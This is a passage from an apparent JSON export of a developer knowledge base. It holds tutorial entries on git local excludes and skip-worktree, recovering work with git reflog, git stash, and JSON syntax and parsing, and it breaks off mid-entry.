directly\necho \"pattern\" >> .git/info/exclude\nvim .git/info/exclude  # Edit like any text file\n\n# Remove: Delete line from file\nvim .git/info/exclude  # Remove the pattern\n\n\n# skip-worktree: Use git commands\ngit update-index --skip-worktree path/to/file  # Set\n\ngit update-index --no-skip-worktree path/to/file  # Remove\n\n# List files with skip-worktree\ngit ls-files -v | grep ^S\n```\n\n### 4. Visibility and Discovery\n\n```bash\n# .git/info/exclude: Easy to view\ncat .git/info/exclude\n# Shows all patterns\n\n# skip-worktree: Requires specific command\ngit ls-files -v | grep ^S\n# S indicates skip-worktree flag set\n\n# Example output:\n# S config/database.yml\n# S .env\n# S settings.json\n```\n\n### 5. When They Take Effect\n\n```bash\n# .git/info/exclude: Immediate effect\necho \"new-ignore.txt\" >> .git/info/exclude\ntouch new-ignore.txt\ngit status  # new-ignore.txt not shown (immediate)\n\n\n# skip-worktree: Only affects already-tracked files\ntouch new-file.txt\ngit update-index --skip-worktree new-file.txt  # ❌ Error\n# fatal: Unable to mark file new-file.txt\n\n# Must be tracked first:\ngit add new-file.txt\ngit commit -m \"Add file\"\ngit update-index --skip-worktree new-file.txt  # ✅ Works\n```\n\n### 6. Behavior with Git Operations\n\n```bash\n# .git/info/exclude: Simple ignore behavior\ngit add ignored-file.txt  # ❌ Ignored, can't add\n\n# Can force add:\ngit add -f ignored-file.txt  # ✅ Forces tracking\n\n\n# skip-worktree: More complex behavior\ngit update-index --skip-worktree config.json\n\n# Modify config.json locally\ngit status  # Clean\n\n# Try to pull changes to config.json\ngit pull\n# If remote has changes: ⚠️ Warning or conflict\n# error: Your local changes to the following files would be overwritten\n\n# Must handle manually:\ngit update-index --no-skip-worktree config.json\ngit stash\ngit pull\ngit stash pop\ngit update-index --skip-worktree config.json\n```\n\n### 7. Sharing and Collaboration\n\n```bash\n# .git/info/exclude: Cannot be shared\n# Each developer maintains their own .git/info/exclude\n# No way to share these patterns automatically\n\n# If you need shared ignore patterns:\necho \"pattern\" >> .gitignore  # Use .gitignore instead\ngit commit -m \"Add to gitignore\"\n\n\n# skip-worktree: Cannot be shared\n# Each developer must set skip-worktree independently\n\n# Documentation approach:\n# README.md\necho \"Setup for development:\" >> README.md\necho \"git update-index --skip-worktree config/database.yml\" >> README.md\n\n# Or setup script:\n# setup.sh\n#!/bin/bash\ngit update-index --skip-worktree config/database.yml\ngit update-index --skip-worktree .env\n```\n\n## Practical Examples\n\n### Example 1: .git/info/exclude for Local Tools\n\n```bash\n# Scenario: Using local development tools not used by team\n\n# .git/info/exclude\n# My local development database\npostgres-data/\n\n# My personal deployment scripts\ndeploy-local.sh\nbackup-*.sql\n\n# My debugging output\ndebug-logs/\n*.debug\n\n# My IDE's scratch files\n.vscode/scratch/\n.idea/workspace.xml\n\n# Now these files won't show in git status\n# Even though they're in your working directory\n```\n\n### Example 2: skip-worktree for Environment Configs\n\n```bash\n# Scenario: Different database per developer\n\n# 1. Repository has template config\n# config/database.yml (committed)\ndevelopment:\n  host: localhost\n  username: <%= ENV['DB_USER'] %>\n  password: <%= ENV['DB_PASS'] %>\n\n# 2. Each developer customizes locally\ngit update-index --skip-worktree config/database.yml\n\n# 3. Modify for your local setup\n# config/database.yml (local only)\ndevelopment:\n  host: localhost\n  username: john_local\n  password: my_password\n  pool: 10\n\n# 4. Git ignores your local changes\ngit status  # Clean\n\n# 5. Template updates still work (with care)\ngit pull  # Gets updates to template\n```\n\n### Example 3: Combined Usage\n\n```bash\n# Real-world Node.js project\n\n# .git/info/exclude (local-only files)\n# My local testing scripts\nscripts/test-local.sh\n\n# My personal notes\nNOTES.md\nTODO-personal.md\n\n# My local environment overrides\n.env.local\n\n# Coverage reports I generate locally\ncoverage-local/\n\n\n# skip-worktree (tracked but customized)\ngit update-index --skip-worktree .env\n# .env contains real API keys locally\n# Repository has .env with placeholders\n\ngit update-index --skip-worktree config/webpack.dev.js\n# Custom webpack config for local development\n# Repository has standard config\n```\n\n### Example 4: Large Team Configuration\n\n```bash\n# Scenario: 50 developers, each needs custom API endpoints\n\n# Repository structure:\nconfig/\n  ├── api.template.json  # Committed template\n  └── api.json          # Gitignored, generated locally\n\n# .gitignore (shared)\nconfig/api.json\n\n# setup.sh (committed script)\n#!/bin/bash\ncp config/api.template.json config/api.json\necho \"Edit config/api.json with your settings\"\n\n# Each developer:\n./setup.sh\nvim config/api.json  # Add their API keys\n\n# Alternative approach with skip-worktree:\n# If api.json must be tracked (for some reason):\ngit add config/api.json\ngit commit -m \"Add API config template\"\n\n# Each developer:\ngit update-index --skip-worktree config/api.json\nvim config/api.json  # Customize\n```\n\n### Example 5: IDE and Build Artifacts\n\n```bash\n# .git/info/exclude approach\n# .git/info/exclude\n\n# WebStorm/IntelliJ\n.idea/workspace.xml\n.idea/usage.statistics.xml\n.idea/shelf/\n\n# VS Code\n.vscode/settings.json\n.vscode/*.log\n\n# Build artifacts\ndist/\nbuild/\n*.log\n*.tmp\n\n# OS files\n.DS_Store\nThumbs.db\n\n# This is better than skip-worktree because:\n# - These files should never be tracked\n# - Each developer has different IDE files\n# - No need to mark tracked files\n```\n\n## Common Pitfalls\n\n- Using skip-worktree on files frequently updated upstream (causes conflicts)\n- Forgetting to document skip-worktree flags for team members\n- Using .git/info/exclude when .gitignore would be better (team-wide patterns)\n- Not removing skip-worktree before git pull when conflicts expected\n- Committing .git/info/exclude (impossible, but trying to share it)\n- Using skip-worktree as security (it's not—files still in history)\n- Losing track of which files have skip-worktree set\n\n## Practical Applications\n\n**.git/info/exclude:**\n- Personal IDE configurations\n- Local build artifacts\n- Developer-specific scripts\n- Temporary testing files\n- OS-specific files\n- Local documentation notes\n\n**skip-worktree:**\n- Environment-specific configs (dev/staging/prod)\n- API keys and secrets (with committed templates)\n- Database connection strings\n- Feature flags for local testing\n- Performance tuning configs\n- Debug settings\n\n## Decision Guide\n\n```bash\n# Use .git/info/exclude when:\n✅ File is NOT tracked\n✅ File is personal/local-only\n✅ File should NEVER be in repository\n✅ Pattern applies to multiple files\n✅ Similar to .gitignore but local-only\n\nExample:\necho \"my-local-tools/\" >> .git/info/exclude\n\n\n# Use skip-worktree when:\n✅ File IS tracked\n✅ File needs local modifications\n✅ File must exist in repository (template/default)\n✅ Changes are environment-specific\n✅ You need different values per developer\n\nExample:\ngit update-index --skip-worktree config/settings.json\n\n\n# Use .gitignore when:\n✅ Pattern should be shared with team\n✅ Files are build artifacts\n✅ Files are dependency folders\n✅ Standard ignore patterns\n\nExample:\necho \"node_modules/\" >> .gitignore\ngit add .gitignore\ngit commit -m \"Ignore node_modules\"\n\n\n# Use assume-unchanged when:\n✅ Performance optimization for large files\n✅ File won't change (99% certain)\n✅ Temporary optimization (unlike skip-worktree)\n\nExample:\ngit update-index --assume-unchanged large-static-file.dat\n```\n\n## Management Scripts\n\n### List All Ignored Files\n\n```bash\n#!/bin/bash\n# list-ignores.sh\n\necho \"=== .gitignore patterns ===\"\ncat .gitignore\n\necho -e \"\\n=== .git/info/exclude patterns ===\"\ncat .git/info/exclude\n\necho -e \"\\n=== skip-worktree files ===\"\ngit ls-files -v | grep ^S | cut -c3-\n\necho -e \"\\n=== assume-unchanged files ===\"\ngit ls-files -v | grep ^h | cut -c3-\n```\n\n### Setup Script for New Developers\n\n```bash\n#!/bin/bash\n# setup-local-dev.sh\n\necho \"Setting up local development environment...\"\n\n# Copy template configs\ncp config/database.template.yml config/database.yml\ncp .env.template .env\n\n# Set skip-worktree flags\necho \"Setting skip-worktree flags...\"\ngit update-index --skip-worktree config/database.yml\ngit update-index --skip-worktree .env\n\n# Add to local exclude\necho \"Configuring local excludes...\"\ncat >> .git/info/exclude << EOF\n# Local development files\n*.local.js\ncoverage-local/\ntest-results-local/\nEOF\n\necho \"Setup complete!\"\necho \"Edit the following files with your local settings:\"\necho \"  - config/database.yml\"\necho \"  - .env\"\n```\n\n### Cleanup Script\n\n```bash\n#!/bin/bash\n# cleanup-local.sh\n\necho \"Removing all skip-worktree flags...\"\ngit ls-files -v | grep ^S | cut -c3- | while read file; do\n  echo \"Removing skip-worktree from: $file\"\n  git update-index --no-skip-worktree \"$file\"\ndone\n\necho \"Cleanup complete!\"\n```\n\n## Best Practices\n\n```bash\n# ✅ Document skip-worktree in README\n# README.md\n## Local Development Setup\n\nAfter cloning, run these commands:\n\n```bash\n# Mark config files as skip-worktree\ngit update-index --skip-worktree config/database.yml\ngit update-index --skip-worktree .env\n\n# Copy and customize templates\ncp .env.template .env\nvim .env  # Add your API keys\n```\n\n# ✅ Use .git/info/exclude for truly local files\n# .git/info/exclude\n# My testing data\ntest-data-local/\n\n# My scratch files\nscratch/\nnotes.txt\n\n# ✅ Provide templates for skip-worktree files\n# Commit: config.template.json\n# Ignore: config.json (or use skip-worktree)\n\n# ✅ List skip-worktree files regularly\ngit ls-files -v | grep ^S\n\n# ✅ Remove skip-worktree before major updates\ngit update-index --no-skip-worktree config.yml\ngit pull\ngit update-index --skip-worktree config.yml\n```\n\n## References\n\n- [Git Documentation: gitignore](https://git-scm.com/docs/gitignore)\n- [Git Documentation: git-update-index](https://git-scm.com/docs/git-update-index)\n- [Git FAQ: Ignoring Files](https://git-scm.com/book/en/v2/Git-Basics-Recording-Changes-to-the-Repository#_ignoring)\n- [Skip-worktree vs Assume-unchanged](https://stackoverflow.com/questions/13630849/git-difference-between-assume-unchanged-and-skip-worktree)\n\n---\n\n## Quick Reference\n\n| Feature | .git/info/exclude | skip-worktree |\n|---------|-------------------|---------------|\n| **Target** | Untracked files | Tracked files |\n| **Purpose** | Ignore new files | Ignore local changes |\n| **Syntax** | File patterns | File paths |\n| **Set** | Edit file | `git update-index --skip-worktree` |\n| **Remove** | Edit file | `git update-index --no-skip-worktree` |\n| **View** | `cat .git/info/exclude` | `git ls-files -v \\| grep ^S` |\n| **Shared** | No (local only) | No (local only) |\n| **Use Case** | Local tools, IDE files | Environment configs |"
    },
    {
      "id": "swe/misc/git/git-reflog",
      "title": "Git Reflog: Complete Overview",
      "path": [
        "swe",
        "misc",
        "git",
        "git-reflog"
      ],
      "content": "# Git Reflog: Complete Overview\n\n`git reflog` (reference log) records every time a branch tip or `HEAD` moves in your local repository. Think of it as **git's undo history** — while `git log` shows your commit history (the story you're telling), `reflog` shows every action *you actually took*, including the ones that don't appear in `git log` anymore. It's the safety net that makes \"I lost my work\" almost never permanently true.\n\n## Key Points\n\n- **Local Only:** Reflog exists only on your machine — it's not pushed to remotes or shared with collaborators.\n- **Records HEAD Movement:** Every checkout, commit, rebase, reset, merge, cherry-pick, and amend is logged.\n- **Default Retention:** Entries expire after 90 days (30 days for unreachable commits).\n- **Recovery Tool:** The primary use case is recovering from mistakes — bad rebases, accidental resets, lost commits.\n- **Not a Branch History:** `git log` shows commit ancestry. `reflog` shows a chronological diary of *your actions*.\n\n## How It Works\n\nEvery time `HEAD` moves, Git appends an entry to `.git/logs/HEAD`. Each entry records: the previous SHA, the new SHA, who did it, when, and what action caused it.\n\n```\ngit commit → reflog entry\ngit checkout → reflog entry\ngit rebase → reflog entry (one per step)\ngit reset → reflog entry\ngit pull → reflog entry\ngit merge → reflog entry\ngit cherry-pick → reflog entry\ngit commit --amend → reflog entry\n```\n\n**Analogy:** If `git log` is the published version of a book, `reflog` is the author's notebook with every draft, deleted paragraph, and rewrite — all timestamped.\n\n## Step-by-Step Explanation & Examples\n\n### 1. Viewing the Reflog\n\n```bash\n# Basic reflog output\ngit reflog\n\n# Output:\na1b2c3d (HEAD -> main) HEAD@{0}: commit: add user validation\nf4e5d6c HEAD@{1}: commit: update API routes\n8g7h9i0 HEAD@{2}: checkout: moving from feature/auth to main\nb2c3d4e HEAD@{3}: commit: implement JWT refresh tokens\ne5f6g7h HEAD@{4}: rebase (finish): returning to refs/heads/feature/auth\nk8l9m0n HEAD@{5}: reset: moving to HEAD~3\n```\n\nEach line reads as: **SHA** — **reference** — **action**: **description**\n\nThe `HEAD@{n}` syntax means \"where HEAD was `n` moves ago.\" This is a first-class Git reference — you can use it anywhere you'd use a commit SHA.\n\n### 2. Recovering a Lost Commit After `reset --hard`\n\nThe most common \"oh no\" moment. You ran `git reset --hard` and commits seem gone.\n\n```bash\n# You accidentally nuked the last 3 commits\ngit reset --hard HEAD~3\n\n# Your commits aren't in git log anymore. But reflog has them:\ngit reflog\n# a1b2c3d HEAD@{0}: reset: moving to HEAD~3\n# x9y8z7w HEAD@{1}: commit: add payment processing    ← here it is\n# p6q5r4s HEAD@{2}: commit: add order validation\n# m3n2o1p HEAD@{3}: commit: add cart service\n\n# Recover by resetting back to where you were\ngit reset --hard x9y8z7w\n\n# Or cherry-pick specific commits\ngit cherry-pick p6q5r4s x9y8z7w\n```\n\n### 3. Undoing a Bad Rebase\n\nRebases rewrite history, which makes them scary. Reflog makes them reversible.\n\n```bash\n# You rebased feature branch onto main and it went wrong\ngit rebase main\n# ... conflicts everywhere, you resolved them incorrectly\n\n# Find the commit right before the rebase started\ngit reflog\n# d4e5f6g HEAD@{0}: rebase (finish): returning to refs/heads/feature/auth\n# c3d4e5f HEAD@{1}: rebase (pick): implement login\n# b2c3d4e HEAD@{2}: rebase (pick): add auth middleware\n# a1b2c3d HEAD@{3}: rebase (start): checkout main\n# ★ f7g8h9i HEAD@{4}: commit: implement JWT refresh tokens  ← pre-rebase state\n\n# Reset to the pre-rebase state\ngit reset --hard f7g8h9i\n```\n\nThe commit at `HEAD@{4}` is where your branch was *before* the rebase started. Resetting to it completely undoes the rebase.\n\n### 4. Recovering a Deleted Branch\n\n```bash\n# You deleted a branch before merging it\ngit branch -D feature/payments\n# Deleted branch feature/payments (was a1b2c3d)\n\n# The SHA is right there in the output, but if you missed it:\ngit reflog | grep payments\n# a1b2c3d HEAD@{12}: commit: finalize payment flow\n# b2c3d4e HEAD@{13}: checkout: moving from main to feature/payments\n\n# Recreate the branch at that commit\ngit branch feature/payments a1b2c3d\n\n# Or use reflog reference directly\ngit checkout -b feature/payments HEAD@{12}\n```\n\n### 5. Undoing a Bad `commit --amend`\n\nYou amended a commit and accidentally overwrote the wrong message or included wrong files.\n\n```bash\ngit commit --amend -m \"wrong message, overwrote my good commit\"\n\n# Reflog shows the pre-amend commit\ngit reflog\n# n3w5ha0 HEAD@{0}: commit (amend): wrong message, overwrote my good commit\n# 0rig1na HEAD@{1}: commit: add user authentication  ← the original\n\n# Restore the original\ngit reset --hard 0rig1na\n```\n\n### 6. Finding Work from Days Ago\n\n```bash\n# \"What was I working on last Tuesday?\"\ngit reflog --date=relative\n# a1b2c3d HEAD@{3 days ago}: commit: fix auth bug\n# b2c3d4e HEAD@{3 days ago}: checkout: moving from main to fix/auth-bug\n# c3d4e5f HEAD@{5 days ago}: pull: Fast-forward\n\n# Or with absolute dates\ngit reflog --date=iso\n# a1b2c3d HEAD@{2025-02-22 14:32:07 -0800}: commit: fix auth bug\n\n# Filter by date\ngit reflog --since=\"3 days ago\"\n```\n\n### 7. Branch-Specific Reflog\n\nEach branch has its own reflog, not just `HEAD`.\n\n```bash\n# See reflog for a specific branch\ngit reflog show main\n# a1b2c3d main@{0}: merge feature/auth: Fast-forward\n# b2c3d4e main@{1}: commit: update README\n# c3d4e5f main@{2}: pull: Fast-forward\n\n# Use branch reflog references\ngit diff main@{1} main@{0}    # what changed in the last move of main\ngit log main@{yesterday}..main  # what was added to main since yesterday\n```\n\n### 8. Useful Formatting Options\n\n```bash\n# One-line with timestamps\ngit reflog --format='%C(auto)%h %gd %gs (%ci)'\n\n# Only show commits (filter out checkouts, merges, etc.)\ngit reflog --grep-reflog=\"commit\"\n\n# Show with full diff\ngit reflog -p\n\n# Limit output\ngit reflog -n 20\n```\n\n## The Reflog Recovery Workflow\n\nWhen you think you've lost work, follow this mental checklist:\n\n```\n1. Don't panic. If you committed it, reflog has it.\n        ↓\n2. Run `git reflog` and scan for the action before the mistake.\n        ↓\n3. Identify the SHA of the \"good\" state.\n        ↓\n4. Choose your recovery method:\n   ├── git reset --hard <sha>     → rewind branch to that state\n   ├── git cherry-pick <sha>      → apply specific commit(s) onto current branch\n   ├── git branch <name> <sha>    → create new branch at that point\n   └── git checkout <sha> -- file → restore a specific file\n```\n\n## Common Pitfalls\n\n- **Assuming reflog is shared.** It's strictly local. If you need to recover someone else's work, reflog won't help — you need the remote or their machine.\n- **Waiting too long.** Unreachable commits (those not on any branch) expire after 30 days by default. Reachable entries last 90 days. If you lost something weeks ago, recover it sooner rather than later.\n- **Confusing `reflog` with `log`.** `git log` follows commit parentage (the DAG). `reflog` follows HEAD movement chronologically. A commit can disappear from `log` after a rebase but still exist in `reflog`.\n- **Not committing often enough.** Reflog can only recover *committed* work. Uncommitted changes that are lost to `git checkout -- .` or `git reset --hard` are gone unless they were staged (check `git fsck --lost-found` for staged-but-uncommitted blobs).\n- **Running `git gc` prematurely.** Garbage collection permanently removes unreachable objects. Avoid `git gc --prune=now` if you're trying to recover lost commits.\n\n## Practical Applications\n\n- **Undoing mistakes:** Bad rebase, accidental `reset --hard`, wrong `commit --amend`, or deleted branch — reflog covers all of them.\n- **Auditing your own workflow:** See exactly what you did in a repo over the last week — useful for writing standup notes or timesheets.\n- **Comparing states:** `git diff HEAD@{yesterday} HEAD` shows everything that changed in your working branch since yesterday.\n- **Training wheels for risky operations:** Before attempting a complex rebase or history rewrite, note the current reflog position. If anything goes wrong, you know exactly where to reset back to.\n\n## References\n\n- [Git Documentation: git-reflog](https://git-scm.com/docs/git-reflog)\n- [Pro Git Book: Data Recovery](https://git-scm.com/book/en/v2/Git-Internals-Maintenance-and-Data-Recovery)\n- [Git Documentation: gitrevisions (HEAD@{n} syntax)](https://git-scm.com/docs/gitrevisions)\n- [Atlassian: Git Reflog](https://www.atlassian.com/git/tutorials/rewriting-history/git-reflog)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **`git fsck --lost-found`:** When reflog doesn't have what you need (e.g., staged but never committed files), `fsck` finds dangling blobs and commits that are truly orphaned. Recovered objects go to `.git/lost-found/`.\n- **Reflog Expiry Configuration:** Customize retention with `git config gc.reflogExpire 180.days` (reachable) and `gc.reflogExpireUnreachable 60.days` (unreachable). Useful for teams that want a longer safety net.\n- **Reflog in Scripts:** `git reflog` is scriptable. For example, `git rev-parse HEAD@{1}` returns the SHA of the previous HEAD position — useful in CI/CD scripts to detect what changed.\n- **Stash Reflog:** `git stash` has its own reflog. If you accidentally drop a stash, `git fsck --unreachable | grep commit` followed by `git show <sha>` can often recover it.\n- **Interactive Recovery with `git log -g`:** Running `git log -g` shows the reflog in standard `git log` format with full commit messages and diffs, which can be easier to scan than the default reflog output."
    },
    {
      "id": "swe/misc/git/git-stash",
      "title": "Git Stash: A Well-Structured Overview",
      "path": [
        "swe",
        "misc",
        "git",
        "git-stash"
      ],
      "content": "# Git Stash: A Well-Structured Overview\n\nGit stash temporarily shelves uncommitted changes in your working directory, allowing you to switch branches or pull updates without committing incomplete work, then reapply those changes later.\n\n## Key Points\n\n- **Definition:** A command that saves your uncommitted modifications (staged and unstaged) to a stack, reverting your working directory to match HEAD.\n- **Use Case:** Switch contexts without committing half-finished work, pull updates without conflicts, or clean your working directory temporarily.\n- **Stack-Based:** Multiple stashes can be stored, organized as a stack (LIFO - Last In, First Out).\n- **Includes Staging:** Preserves both staged and unstaged changes, maintaining their status when reapplied.\n- **Non-Destructive:** Changes remain in stash even after applying, allowing safe experimentation.\n- **Branch Independence:** Stashes can be applied to any branch, not just where they were created.\n- **Untracked Files:** By default excludes untracked files unless explicitly included.\n\n## Step-by-Step Explanation & Examples\n\n**Basic Stash Operations**\n```bash\n# Stash current changes with automatic message\ngit stash\n# Creates: \"WIP on branch_name: commit_hash commit_message\"\n\n# Stash with custom descriptive message\ngit stash push -m \"work in progress on user authentication feature\"\n# Message helps identify stashes later\n\n# List all stashes (newest first)\ngit stash list\n# Output:\n# stash@{0}: On main: work in progress on user authentication\n# stash@{1}: WIP on feature: abc1234 add validation\n# stash@{2}: On main: temporary changes\n\n# Apply most recent stash (keeps it in stash list)\ngit stash apply\n# Or apply specific stash by reference\ngit stash apply stash@{1}\n\n# Apply and remove stash in one command\ngit stash pop\n# Equivalent to: git stash apply && git stash drop\n\n# Remove specific stash without applying\ngit stash drop stash@{0}\n\n# Clear all stashes (careful - irreversible)\ngit stash clear\n```\n\n**Advanced Stash Usage**\n```bash\n# Stash including untracked files (new files not yet added)\ngit stash -u\n# Or --include-untracked\n\n# Stash everything including ignored files\ngit stash -a\n# Or --all\n\n# Stash only specific files (partial stash)\ngit stash push -m \"stash styles only\" src/styles.css src/theme.js\n\n# Create branch from stash (useful for complex changes)\ngit stash branch new-feature-branch stash@{0}\n# Creates branch, applies stash, then drops it\n\n# View stash contents without applying\ngit stash show\n# Shows summary: 2 files changed, 15 insertions(+), 3 deletions(-)\n\n# View detailed diff of stash\ngit stash show -p stash@{0}\n# Shows full patch/diff of changes\n\n# Apply stash but preserve staged/unstaged status\ngit stash apply --index\n# Without --index, all changes become unstaged\n```\n\n## Common Pitfalls\n\n- Forgetting which stash contains what—always use descriptive messages with `-m`.\n- Using `pop` on stashes with conflicts—conflicts prevent automatic drop, leaving stash duplicated.\n- Not including untracked files with `-u`, then wondering why new files disappeared.\n- Assuming stashes are branch-specific—they're global and can cause confusion across branches.\n- Stashing when you should commit—stashes aren't backups, they're temporary storage.\n- Letting stashes accumulate without cleanup—old stashes become hard to identify.\n- Applying stash to wrong branch, creating merge conflicts unnecessarily.\n\n## Practical Applications\n\n- **Context Switching:** Stash feature work to quickly fix production bug on main branch.\n- **Pulling Updates:** Clean working directory before pulling to avoid merge conflicts.\n- **Experimentation:** Try different approaches without committing, reverting via stash if needed.\n- **Code Review:** Temporarily remove local changes to test teammate's branch cleanly.\n\n**Example anecdote:** While building a complex feature, your team lead asks you to urgently fix a typo on the production branch. Rather than committing incomplete code or losing 2 hours of work, `git stash -u` saves everything. You switch branches, fix the typo, deploy, then `git stash pop` and continue exactly where you left off—like hitting pause on your work.\n\n## References\n\n- [Git Stash Documentation](https://git-scm.com/docs/git-stash)\n- [Atlassian Git Stash Tutorial](https://www.atlassian.com/git/tutorials/saving-changes/git-stash)\n- [Git Stash Best Practices](https://www.git-tower.com/learn/git/faq/save-changes-with-git-stash)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Stash Stack Structure:** Stashes stored as special commit objects with references to working tree, index, and parent commit states.\n- **Partial Stashing (Interactive):** Use `git stash -p` for interactive patch mode, choosing which hunks to stash.\n- **Conflict Resolution:** When applying stashes with conflicts, Git marks conflicts like merge conflicts—resolve and manually `git stash drop`.\n- **Stash References:** `stash@{0}` is newest, `stash@{n}` is older. References update when stashes are dropped.\n- **WIP vs Index Commits:** Each stash contains multiple commits: working directory state and index (staging) state.\n- **Recovery:** Recently dropped stashes can be recovered via `git fsck --unreachable | grep commit` and `git show`.\n- **Stash vs Commit:** Commits are permanent history, stashes are temporary—use commits for checkpoints, stashes for interruptions.\n- **Automation Scripts:** Integrate `git stash` in deployment scripts to ensure clean working directory.\n- **Pre-stash Hooks:** No built-in hooks, but can wrap stash commands in scripts for custom workflows.\n- **Stash with Pathspec:** Target specific paths: `git stash push -m \"message\" -- path/to/file`.\n- **Keep Index:** Use `git stash --keep-index` to stash unstaged changes while keeping staged changes in working directory.\n- **Creating Patches:** Export stash as patch file: `git stash show -p stash@{0} > changes.patch`.\n- **Multiple Worktrees:** Each worktree has independent stash stack in older Git versions; newer versions share stashes.\n- **Stash in Detached HEAD:** Works normally, but be aware stashes aren't tied to specific branch or commit.\n- **GUI Tools:** GitKraken, SourceTree, and VS Code provide visual stash management interfaces."
    },
    {
      "id": "swe/misc/json",
      "title": "JSON (JavaScript Object Notation): Complete Overview",
      "path": [
        "swe",
        "misc",
        "json"
      ],
      "content": "# JSON (JavaScript Object Notation): Complete Overview\n\nJSON is a lightweight, text-based data format for exchanging information between systems. It uses human-readable key-value pairs and arrays, derived from JavaScript object syntax but language-independent. Think of JSON as the universal language of the web—like English became the common language for international air traffic control, JSON became the standard format for APIs and data exchange.\n\n## Key Points\n\n- **Format:** Text-based, human-readable data structure\n- **Syntax:** Key-value pairs `{\"key\": \"value\"}` and arrays `[1, 2, 3]`\n- **Language-Independent:** Works with any programming language\n- **Use Cases:** APIs, configuration files, data storage, message passing\n- **Types:** Strings, numbers, booleans, null, objects, arrays\n\n## Brief History\n\n```\n1999: Douglas Crockford discovers subset of JavaScript for data exchange\n2001: JSON.org published, spec formalized\n2005: AJAX popularizes JSON for web APIs (replacing XML)\n2013: ECMA-404 standard published\n2017: RFC 8259 becomes Internet Standard\nToday: De facto standard for web APIs\n\nWhy it won: Simpler than XML, human-readable, works everywhere\n```\n\n## Basic Syntax\n\n### Data Types\n\n```json\n{\n  \"string\": \"Hello\",\n  \"number\": 42,\n  \"float\": 3.14,\n  \"boolean\": true,\n  \"null\": null,\n  \"array\": [1, 2, 3],\n  \"object\": {\n    \"nested\": \"value\"\n  }\n}\n```\n\n### Rules\n\n```json\n// ✅ Valid JSON\n{\n  \"name\": \"John\",\n  \"age\": 30,\n  \"active\": true,\n  \"skills\": [\"JavaScript\", \"Python\"],\n  \"address\": {\n    \"city\": \"New York\",\n    \"zip\": \"10001\"\n  }\n}\n\n// ❌ Invalid JSON\n{\n  name: \"John\",           // Missing quotes on key\n  'age': 30,              // Single quotes not allowed\n  active: true,           // Missing quotes on key\n  skills: [1, 2, 3,],     // Trailing comma\n  comment: \"test\"         // Comments not allowed\n}\n```\n\n## Parsing and Stringifying\n\n### JavaScript\n\n```javascript\n// Parse: String → Object\nconst jsonString = '{\"name\":\"John\",\"age\":30}';\nconst obj = JSON.parse(jsonString);\nconsole.log(obj.name);  // \"John\"\n\n// Stringify: Object → String\nconst user = { name: \"Alice\", age: 25 };\nconst json = JSON.stringify(user);\nconsole.log(json);  // '{\"name\":\"Alice\",\"age\":25}'\n\n// Pretty print with indentation\nconst prettyJson = JSON.stringify(user, null, 2);\n/*\n{\n  \"name\": \"Alice\",\n  \"age\": 25\n}\n*/\n\n// Stringify with filter\nconst filtered = JSON.stringify(user, ['name']);  // Only name field\nconsole.log(filtered);  // '{\"name\":\"Alice\"}'\n```\n\n### Error Handling\n\n```javascript\n// Always wrap JSON.parse in try-catch\ntry {\n  const data = JSON.parse(invalidJson);\n} catch (error) {\n  console.error('Invalid JSON:', error.message);\n}\n\n// Safe parse helper\nfunction safeParse(jsonString, fallback = {}) {\n  try {\n    return JSON.parse(jsonString);\n  } catch (error) {\n    return fallback;\n  }\n}\n\nconst data = safeParse(response, { error: true });\n```\n\n### Other Languages\n\n```python\n# Python\nimport json\n\n# Parse\ndata = json.loads('{\"name\": \"John\", \"age\": 30}')\nprint(data['name'])  # John\n\n# Stringify\njson_str = json.dumps({\"name\": \"Alice\", \"age\": 25})\n\n# Pretty print\npretty = json.dumps(data, indent=2)\n```\n\n```java\n// Java (using Jackson or Gson)\nimport com.fasterxml.jackson.databind.ObjectMapper;\n\nObjectMapper mapper = new ObjectMapper();\n\n// Parse\nUser user = mapper.readValue(jsonString, User.class);\n\n// Stringify\nString json = mapper.writeValueAsString(user);\n```\n\n```go\n// Go\nimport \"encoding/json\"\n\n// Parse\nvar user User\njson.Unmarshal([]byte(jsonString), &user)\n\n// Stringify\njsonBytes, _ := json.Marshal(user)\n```\n\n## Common Use Cases\n\n### 1. API Responses\n\n```javascript\n// HTTP Response from server\nfetch('https://api.example.com/users/123')\n  .then(response => response.json())\n  .then(data => {\n    console.log(data);\n    // {\n    //   \"id\": 123,\n    //   \"name\": \"John Doe\",\n    //   \"email\": \"john@example.com\"\n    // }\n  });\n\n// API Request with JSON body\nfetch('https://api.example.com/users', {\n  method: 'POST',\n  headers: { 'Content-Type': 'application/json' },\n  body: JSON.stringify({\n    name: 'Alice',\n    email: 'alice@example.com'\n  })\n});\n```\n\n### 2. Configuration Files\n\n```json\n// package.json\n{\n  \"name\": \"my-app\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"start\": \"node index.js\",\n    \"test\": \"jest\"\n  },\n  \"dependencies\": {\n    \"express\": \"^4.18.0\",\n    \"react\": \"^18.2.0\"\n  }\n}\n\n// .eslintrc.json\n{\n  \"extends\": \"eslint:recommended\",\n  \"rules\": {\n    \"semi\": [\"error\", \"always\"],\n    \"quotes\": [\"error\", \"single\"]\n  }\n}\n\n// tsconfig.json\n{\n  \"compilerOptions\": {\n    \"target\": \"ES2020\",\n    \"module\": \"commonjs\",\n    \"strict\": true\n  }\n}\n```\n\n### 3. Data Storage\n\n```javascript\n// LocalStorage\nconst user = { name: 'John', preferences: { theme: 'dark' } };\nlocalStorage.setItem('user', JSON.stringify(user));\n\n// Retrieve\nconst stored = JSON.parse(localStorage.getItem('user'));\n\n// MongoDB (stores as BSON, but JSON-like)\ndb.users.insertOne({\n  name: 'John',\n  age: 30,\n  skills: ['JavaScript', 'Python']\n});\n```\n\n### 4. Message Passing\n\n```javascript\n// WebSocket message\nconst message = {\n  type: 'chat',\n  userId: 123,\n  text: 'Hello',\n  timestamp: Date.now()\n};\nsocket.send(JSON.stringify(message));\n\n// Receive\nsocket.onmessage = (event) => {\n  const data = JSON.parse(event.data);\n  console.log(data.text);\n};\n\n// AWS EventBridge\nconst event = {\n  Source: 'myapp',\n  DetailType: 'User Created',\n  Detail: JSON.stringify({\n    userId: '123',\n    email: 'user@example.com'\n  })\n};\n```\n\n## Advanced Techniques\n\n### Custom Serialization\n\n```javascript\n// toJSON method controls serialization\nclass User {\n  constructor(name, password) {\n    this.name = name;\n    this._password = password;\n  }\n  \n  toJSON() {\n    return {\n      name: this.name\n      // Password excluded from JSON\n    };\n  }\n}\n\nconst user = new User('John', 'secret');\nJSON.stringify(user);  // '{\"name\":\"John\"}'\n\n// Replacer function\nconst 